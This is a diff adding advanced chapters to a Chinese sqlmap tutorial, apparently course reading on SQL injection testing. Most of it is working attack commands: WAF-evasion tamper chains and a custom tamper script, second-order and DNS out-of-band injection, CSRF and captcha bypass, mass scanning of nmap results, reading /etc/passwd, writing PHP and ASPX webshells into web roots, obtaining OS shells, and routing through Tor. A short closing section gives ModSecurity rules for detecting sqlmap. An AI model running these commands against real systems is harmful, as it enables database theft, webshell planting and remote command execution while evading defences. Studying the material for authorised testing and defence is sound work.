@@ -627,6 +627,317 @@ Tamper 绕过：    --tamper=space2comment,randomcase,between
 命令执行：       --os-shell
 ```
 
+---
+
+## 十三、Tamper 脚本体系深度解析
+
+### 13.1 Tamper 分类与选用策略
+
+| Tamper 脚本 | 作用 | 适用场景 |
+|:---|:---|:---|
+| **apostrophemask** | 单引号 → UTF-8 全角 | 简单 WAF 绕过 |
+| **base64encode** | Base64 编码注入 payload | JSON/XML 注入点 |
+| **between** | 比较符 → BETWEEN | 过滤 >、= 号 |
+| **bluecoat** | 空格 → %09，替换比较符 | BlueCoat 设备 |
+| **chardoubleencode** | 双重 URL 编码 | URL 解码器绕过 |
+| **charencode** | URL 编码所有字符 | 基本 URL 编码 |
+| **charunicodeencode** | Unicode 编码 | ASP/ASP.NET |
+| **equaltolike** | = → LIKE | 过滤等号的场景 |
+| **greatest** | > → GREATEST() | 过滤比较符的 WAF |
+| **halfversionedmorekeywords** | 添加 MySQL 版本注释 | MySQL 特定 WAF |
+| **htmlencode** | HTML 实体编码 | 反射型 XSS 联合 |
+| **ifnull2ifisnull** | IFNULL → IF(ISNULL()) | MySQL 函数过滤 |
+| **information_schemacomment** | information_schema 加注释 | 过滤关键字 |
+| **luanginx** | LUA+Nginx WAF 绕过 | 特定 WAF 产品 |
+| **modsecurityversioned** | 注释分隔关键字 | ModSecurity |
+| **modsecurityzeroversioned** | 零版本注释绕过 | ModSecurity |
+| **multiplespaces** | 多个空格替换单空格 | 空格过滤不严 |
+| **overlongutf8** | UTF-8 超长编码 | 弱 UTF-8 解析器 |
+| **percentage** | 百分号包裹字符 | ASP 过滤 |
+| **randomcase** | 随机大小写 | 大小写不敏感过滤 |
+| **randomcomments** | 随机注释分割关键字 | 关键字过滤 |
+| **space2comment** | 空格 → /**/ | 空格过滤 |
+| **space2dash** | 空格 → --\n | MSSQL |
+| **space2hash** | 空格 → #注释 | MySQL |
+| **space2morehash** | 空格 → #更多#注释 | MySQL |
+| **space2mssqlblank** | 空格 → MSSQL 空白字符 | MSSQL |
+| **space2mysqlblank** | 空格 → MySQL 空白字符 | MySQL |
+| **space2plus** | 空格 → + | URL 编码场景 |
+| **versionedmorekeywords** | 版本注释包裹关键字 | MySQL |
+| **xforwardedfor** | 添加 X-Forwarded-For 头 | IP 白名单绕过 |
+
+### 13.2 Tamper 组合策略
+
+```bash
+# 轻量绕过（适用于简单 WAF）
+--tamper=between,randomcase,space2comment
+
+# 中等强度（ModSecurity / Cloud WAF）
+--tamper=apostrophemask,space2hash,versionedmorekeywords,charencode
+
+# 极限绕过（多层防御）
+--tamper=space2comment,randomcase,between,charencode,greatest,versionedmorekeywords,bluecoat,percentage
+
+# 自定义 Tamper 组合规则
+# 1. 先用轻量组合探测
+# 2. 根据拦截响应调整
+# 3. 逐步增加 Tamper 直到成功
+```
+
+### 13.3 编写自定义 Tamper 脚本
+
+```python
+# tamper/my_custom_tamper.py
+from lib.core.enums import PRIORITY
+
+__priority__ = PRIORITY.NORMAL
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    """
+    自定义 Tamper：替换敏感关键字为自定义编码
+    
+    Args:
+        payload: 原始 SQL 注入 payload
+        
+    Returns:
+        修改后的 payload
+    """
+    # 示例1：用 char() 函数替代字符串
+    if payload:
+        payload = payload.replace("SELECT", "SeLeCt")
+        payload = payload.replace("UNION", "UnIoN")
+        payload = payload.replace("SLEEP(", "SLEEP/**/(/**/")
+        payload = payload.replace("AND", "&&")
+        payload = payload.replace("OR", "||")
+    return payload
+
+# 使用
+# sqlmap -u URL --tamper=my_custom_tamper
+```
+
+---
+
+## 十四、高级注入技术
+
+### 14.1 二阶 SQL 注入检测
+
+```bash
+# 二阶注入：注入的数据存储后在其他请求中触发
+# 方法1：使用 sqlmap 的 --second-url
+sqlmap -u "http://target.com/register.php" \
+       --data="username=admin&password=123" \
+       --second-url="http://target.com/profile.php" \
+       --second-req="GET"
+
+# 方法2：手动注入存储，sqlmap 扫描读取点
+# 1. 手动在注册页面的 username 字段注入 payload
+# 2. sqlmap 扫描 profile 页面
+sqlmap -u "http://target.com/profile.php" \
+       -p "username" --batch
+```
+
+### 14.2 带外注入（Out-of-Band）
+
+```bash
+# DNS 带外注入
+sqlmap -u "http://target.com/page.php?id=1" \
+       --dns-domain=yourdomain.com \
+       --technique=O
+
+# 需要配置 DNS 服务器
+# 确保目标数据库支持 DNS 查询（如 Oracle UTL_HTTP）
+```
+
+### 14.3 绕过 CSRF Token
+
+```bash
+# 方法1：--csrf-token 自动处理
+sqlmap -u "http://target.com/login.php" \
+       --data="user=admin&pass=123&token=xxx" \
+       --csrf-token="token"
+
+# 方法2：--csrf-url 从独立页面获取 Token
+sqlmap -u "http://target.com/update.php" \
+       --data="name=test&csrf_token=xxx" \
+       --csrf-url="http://target.com/token.php" \
+       --csrf-token="csrf_token"
+```
+
+### 14.4 绕过验证码
+
+```bash
+# 使用 --eval 在每次请求前执行 Python 代码
+sqlmap -u "http://target.com/login.php" \
+       --data="user=admin&pass=123&captcha=xxx" \
+       --eval="import hashlib; captcha = hashlib.md5(str(random.randint(1,9999))).hexdigest()[:5]"
+```
+
+---
+
+## 十五、实战场景扩展
+
+### 场景七：Cookie 注入 + 自定义 Header
+
+```bash
+sqlmap -u "http://target.com/index.php" \
+       --cookie="PHPSESSID=abc; city=1*" \
+       --level=2 \
+       --headers="X-Forwarded-For: 127.0.0.1\nX-Real-IP: 10.0.0.1" \
+       --random-agent \
+       --batch
+```
+
+### 场景八：JSON/REST API 注入
+
+```bash
+# POST JSON 数据
+sqlmap -u "http://target.com/api/user/search" \
+       --data='{"name":"admin","age":30}' \
+       --method=POST \
+       --headers="Content-Type: application/json" \
+       --dbms=mysql
+
+# GraphQL 端点
+sqlmap -u "http://target.com/graphql" \
+       --data='{"query":"{user(id:1){name,email}}"}' \
+       --method=POST
+```
+
+### 场景九：POST 参数+文件上传接口
+
+```bash
+sqlmap -u "http://target.com/upload.php" \
+       --data="username=admin&file=test.jpg" \
+       -p "username" \
+       --batch
+```
+
+### 场景十：批量目标扫描
+
+```bash
+# 从 Burp 日志批量扫描
+# 1. Burp → Save items → burp_log.txt
+# 2. 提取 URL
+cat burp_log.txt | grep "GET\|POST" | sort -u > urls.txt
+
+# 批量扫描
+sqlmap -m urls.txt --batch --random-agent --dbs
+
+# 从 nmap 结果扫描 HTTP 服务
+nmap -p80,443,8080,8443 --open -iL targets.txt -oG - | \
+  awk '/open/{print "http://"$2}' | \
+  xargs -I{} sqlmap -u {} --batch --crawl=3
+```
+
+---
+
+## 十六、文件系统操作
+
+### 16.1 文件读取
+
+```bash
+# 读取系统文件（需要 FILE 权限 + 知道路径）
+sqlmap -u "http://target.com/page.php?id=1" \
+       --file-read="/etc/passwd"
+# 或 Windows
+sqlmap -u "http://target.com/page.php?id=1" \
+       --file-read="C:/Windows/win.ini"
+
+# 读取结果保存在 ~/.sqlmap/output/target.com/files/
+```
+
+### 16.2 文件写入与 WebShell
+
+```bash
+# 写入文件（需要 FILE 权限 + secure_file_priv 为空）
+sqlmap -u "http://target.com/page.php?id=1" \
+       --file-write="shell.php" \
+       --file-dest="/var/www/html/shell.php"
+
+# 写入 Windows ASP WebShell
+sqlmap -u "http://target.com/page.aspx?id=1" \
+       --file-write="shell.aspx" \
+       --file-dest="C:/inetpub/wwwroot/shell.aspx"
+```
+
+### 16.3 获取 OS Shell
+
+```bash
+# 交互式 OS Shell
+sqlmap -u "http://target.com/page.php?id=1" --os-shell
+
+# 选择技术：PHP 的 system() / xp_cmdshell (MSSQL) / UDF (MySQL)
+# sqlmap 自动上传 stager 并获取回连 shell
+
+# 非交互模式执行命令
+sqlmap -u "http://target.com/page.php?id=1" \
+       --os-cmd="whoami"
+```
+
+---
+
+## 十七、性能优化与网络调优
+
+```bash
+# 线程控制
+sqlmap -u URL --threads=5      # 5 线程（默认 1）
+sqlmap -u URL --threads=10     # 最大 10，过快可能被 WAF 检测
+
+# 超时设置
+sqlmap -u URL --timeout=30     # 连接超时 30 秒
+sqlmap -u URL --time-sec=5     # 时间盲注等待时间
+
+# 并发与延迟
+sqlmap -u URL --delay=0.5      # 每次请求间隔 0.5 秒
+sqlmap -u URL --safe-url="http://target.com/" --safe-freq=10  # 每 10 次请求访问一次 safe URL 避免超时
+
+# 代理
+sqlmap -u URL --proxy="http://127.0.0.1:8080"       # HTTP 代理
+sqlmap -u URL --proxy="socks5://127.0.0.1:1080"     # SOCKS5 代理
+sqlmap -u URL --tor --tor-type=SOCKS5               # Tor 匿名化
+```
+
+---
+
+## 十八、报告与分析
+
+```bash
+# 生成详细报告
+sqlmap -u URL --batch --dbs --output-dir=/tmp/sqlmap_report
+
+# 查看结果
+ls -la /tmp/sqlmap_report/target.com/
+# log：详细日志
+# session.sqlite：会话数据
+# target.txt：目标信息
+
+# 恢复会话
+sqlmap -u URL --batch --dbs -s session.sqlite
+```
+
+---
+
+## 十九、sqlmap 检测与规避
+
+### 从防守方视角
+
+```bash
+# sqlmap 的典型特征
+# 1. User-Agent: sqlmap/1.8.x#stable
+# 2. 请求中包含随机注释 /* ... */
+# 3. 短时间内大量含特殊字符的请求
+# 4. 常见的测试参数名
+
+# WAF 规则示例（ModSecurity）
+# SecRule REQUEST_HEADERS:User-Agent "sqlmap" "id:100001,deny"
+# SecRule ARGS "(\bSELECT\b.*\bFROM\b|\bUNION\b.*\bSELECT\b)" "id:100002,deny"
+```
+
+---
+
 > 📖 本文为"网安百宝箱"课程配套读物。
 > 参考：sqlmap 官方 Wiki https://github.com/sqlmapproject/sqlmap/wiki
 > 更新于 2026-06-18
